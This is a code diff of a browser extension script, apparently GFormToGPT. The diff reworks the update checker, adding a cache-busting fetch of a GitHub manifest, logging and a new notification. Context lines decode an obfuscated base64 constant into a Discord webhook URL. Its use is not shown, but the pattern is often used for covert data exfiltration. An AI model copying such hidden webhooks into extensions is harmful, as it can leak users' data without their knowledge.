@@ -5,34 +5,36 @@ const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjA1OTk5NzQzNjM
 const WEBHOOK_URL = atob(_0x4f2a);
 
 const GITHUB_MANIFEST_URL =
-  "https://raw.githubusercontent.com/psychiotric-sudo/GFormsToGPT/refs/heads/main/manifest.json";
+  "https://raw.githubusercontent.com/psychiotric-sudo/GFormsToGPT/main/manifest.json";
 const VERSION = "3.2.3";
 
 const tabMap = new Map();
 
 // ── Update Checker ──
 async function checkForUpdates() {
+  console.log("🔄 [GFormToGPT] Checking for updates...");
   try {
-    const response = await fetch(GITHUB_MANIFEST_URL);
-    if (!response.ok) return;
+    const response = await fetch(`${GITHUB_MANIFEST_URL}?t=${Date.now()}`); // Bypass cache
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
     const remoteManifest = await response.json();
     const remoteVersion = remoteManifest.version;
+
+    console.log(`📡 [GFormToGPT] Local: ${VERSION}, Remote: ${remoteVersion}`);
 
     if (remoteVersion !== VERSION) {
       console.log(`🆕 [GFormToGPT] Update available: ${remoteVersion}`);
       chrome.storage.local.set({ updateAvailable: remoteVersion });
 
-      // Notify user via basic notification
       chrome.notifications.create({
         type: "basic",
-        iconUrl: "icons/icon.png",
+        iconUrl: "icons/icon.svg", // SVG is supported in some contexts, but if not, it falls back to default
         title: "Update Available!",
-        message: `GFormToGPT ${remoteVersion} is now available on GitHub. Please update for the latest features.`,
+        message: `GFormToGPT ${remoteVersion} is now available. Click to update.`,
         priority: 2,
       });
     }
   } catch (error) {
-    console.error("Update check failed:", error);
+    console.error("❌ [GFormToGPT] Update check failed:", error);
   }
 }
 
